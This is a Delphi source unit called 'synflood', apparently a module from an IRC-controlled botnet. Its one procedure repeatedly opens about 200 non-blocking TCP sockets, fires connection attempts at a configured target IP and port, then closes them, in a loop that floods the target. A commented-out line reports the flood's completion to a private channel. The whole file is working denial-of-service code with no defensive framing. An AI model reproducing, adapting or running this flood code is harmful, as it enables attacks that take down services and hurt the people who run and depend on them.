unit synflood;

interface

uses
  winsock,
  windows,
  functions;

type

    Tssyn = Record
      TargetIP        :string;
      TargetPort      :integer;
      len             :integer;
    end;

var
  ddos :Tssyn;
  ssynthread :Thandle;

procedure SendSuperSyn;

const
  SUPERSYN_SOCKETS = 200;

implementation

procedure SendSuperSyn;
var
  superdelay: integer;
  SockAddr: SOCKADDR_IN;
  sock: array [0..SUPERSYN_SOCKETS] of Tsocket;
  iaddr: IN_ADDR;
  mode: integer;
  c,i: integer;
begin
superdelay := 100;
SockAddr.sin_family := AF_INET;
SockAddr.sin_port := htons(ddos.TargetPort);
iaddr.s_addr := INET_ADDR(pchar(ddos.TargetIP));
SockAddr.sin_addr := iaddr; //ip addy
i := 0;
mode := 1;
  while (i < ddos.len) do
  begin
    for c := 0 to SUPERSYN_SOCKETS do begin
			sock[c] := socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] = INVALID_SOCKET) then
      				continue;
			ioctlsocket(sock[c],FIONBIO,mode);
    end;

    for c := 0 to SUPERSYN_SOCKETS do
  			connect(sock[c], SockAddr, sizeof(SockAddr));
        Sleep(superdelay);

    for c := 0 to SUPERSYN_SOCKETS do
			closesocket(sock[c]); //close sockets

   i := i + 1;
  end;
//PrivateMessageChannel('[SSYN] Done with flood (' + IntToStr(i div 1000 div ddos.Len) + 'KB/sec)');
Suspendthread(ssynthread);
ExitThread(0);
end;

end.
